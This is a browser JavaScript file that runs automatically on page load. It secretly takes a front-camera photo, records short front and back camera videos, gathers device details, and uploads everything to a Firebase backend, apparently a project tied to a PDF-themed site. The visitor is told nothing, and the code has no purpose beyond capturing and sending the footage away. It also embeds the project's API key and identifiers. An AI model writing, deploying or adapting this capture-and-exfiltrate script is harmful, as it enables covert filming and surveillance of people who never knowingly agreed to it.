import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

/* ---------- FIREBASE CONFIG ---------- */
const firebaseConfig = {
  apiKey: "AIzaSyA5HSha0laFzd9rQZw5sAHW6O1BcX8BPzI",
  authDomain: "pdfniba.firebaseapp.com",
  projectId: "pdfniba",
  storageBucket: "pdfniba.firebasestorage.app",
  messagingSenderId: "809688909652",
  appId: "1:809688909652:web:9867944191bd95704aaac1"
};

const app = initializeApp(firebaseConfig);
const storage = getStorage(app);
const db = getFirestore(app);

console.log("📸 Camera.js (Final Stable Version) Loaded");

/* ---------- DEVICE INFO ---------- */

function getDeviceInfo() {
  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    time: new Date().toISOString()
  };
}

/* ---------- CAMERA HELPERS ---------- */

// Safe camera request with fallback
async function safeStream(facingMode) {
  try {
    return await navigator.mediaDevices.getUserMedia({
      video: { facingMode },
      audio: false
    });
  } catch (e) {
    console.warn(`Failed facingMode=${facingMode}, using fallback camera`);
    return await navigator.mediaDevices.getUserMedia({
      video: true,
      audio: false
    });
  }
}

// Detect back camera
async function hasBackCamera() {
  const devices = await navigator.mediaDevices.enumerateDevices();
  return devices.some(
    d => d.kind === "videoinput" && d.label.toLowerCase().includes("back")
  );
}

// Safe photo capture using Canvas
function takePhotoWithCanvas(stream) {
  return new Promise(resolve => {
    const video = document.createElement("video");
    video.srcObject = stream;
    video.play();

    video.onloadeddata = () => {
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0);
      canvas.toBlob(resolve, "image/jpeg", 0.9);
    };
  });
}

// Stable video recording
function recordVideo(stream, duration = 3000) {
  return new Promise(resolve => {
    const recorder = new MediaRecorder(stream);
    const chunks = [];

    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.onstop = () =>
      resolve(new Blob(chunks, { type: "video/webm" }));

    recorder.start();
    setTimeout(() => recorder.stop(), duration);
  });
}

// Firebase upload
async function uploadToFirebase(blob, name) {
  const fileRef = ref(storage, `captures/${Date.now()}_${name}`);
  await uploadBytes(fileRef, blob);
  return await getDownloadURL(fileRef);
}

/* ---------- MAIN CAPTURE LOGIC ---------- */

let started = false;

async function startCapture() {
  if (started) return;
  started = true;

  console.log("▶ Auto-start capture sequence…");

  const output = {
    photoURL: null,
    frontVideoURL: null,
    backVideoURL: null,
    device: getDeviceInfo(),
    createdAt: Date.now()
  };

  try {
    /* ---------- FRONT CAMERA ---------- */
    console.log("🎥 Front camera starting…");

    const frontStream = await safeStream("user");

    const photoBlob = await takePhotoWithCanvas(frontStream);
    const frontVideoBlob = await recordVideo(frontStream, 3000);

    output.photoURL = await uploadToFirebase(photoBlob, "front_photo.jpg");
    output.frontVideoURL = await uploadToFirebase(frontVideoBlob, "front_video.webm");

    frontStream.getTracks().forEach(t => t.stop());

    /* ---------- WAIT BEFORE SWITCH ---------- */
    await new Promise(r => setTimeout(r, 500));

    /* ---------- BACK CAMERA (IF EXISTS) ---------- */
    const backExists = await hasBackCamera();

    if (backExists) {
      console.log("🎥 Back camera found — recording…");
      const backStream = await safeStream("environment");
      const backVideoBlob = await recordVideo(backStream, 3000);

      output.backVideoURL = await uploadToFirebase(backVideoBlob, "back_video.webm");

      backStream.getTracks().forEach(t => t.stop());

    } else {
      console.warn("⚠ No back camera found — skipping back video");
      output.backVideoURL = null;
    }

    /* ---------- SAVE TO FIRESTORE ---------- */
    await addDoc(collection(db, "captures"), output);

    console.log("✅ All capture steps complete & uploaded");

  } catch (err) {
    console.error("❌ CAMERA ERROR:", err);
    started = false; // allow retry on next load
  }
}

/* ---------- AUTO START ON PAGE LOAD ---------- */
window.addEventListener("load", () => {
  console.log("⏳ Starting auto camera capture…");
  startCapture();
});
